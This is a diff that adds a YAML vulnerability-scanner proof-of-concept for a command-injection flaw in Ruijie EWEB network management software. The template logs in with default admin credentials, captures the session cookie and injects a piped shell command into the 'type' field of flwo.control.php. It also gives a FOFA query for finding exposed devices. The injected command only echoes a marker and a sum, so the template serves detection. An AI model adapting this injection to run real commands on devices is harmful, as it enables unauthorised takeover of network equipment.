@@ -1,0 +1,37 @@
+id: poc-yaml-ruijie-flwo-control-php-rce
+info:
+  name: 锐捷网络flwo.control.php存在RCE漏洞
+  severity: critical
+  tags:
+  - rce
+  finger: EWEB网管系统
+  fofa: title="锐捷网络-EWEB网管系统"
+variables:
+  t1: random_int(10000,99999)
+  t2: random_int(1000,10000)
+  t3: t1 + t2
+requests:
+- method: POST
+  path: /ddi/server/login.php
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: username=admin&password=admin?
+  expression: 'status_code == 200
+
+    '
+  output:
+  - regex_match(headers,"RUIJIEID=(?P<cookie>.*?);")
+- method: POST
+  path: /flow_control_pi/flwo.control.php?a=getFlowGroup
+  headers:
+    Cookie: RUIJIEID={{.cookie}};user=admin
+    Content-Type: application/x-www-form-urlencoded
+  data: type=|echo "This website has a vulnerability`expr {{.t1}} %2B {{.t2}}`";
+  expression: 'status_code == 200 &&
+
+    contains(body,"This website has a vulnerability") &&
+
+    contains(body,t3)
+
+    '
+transport: http
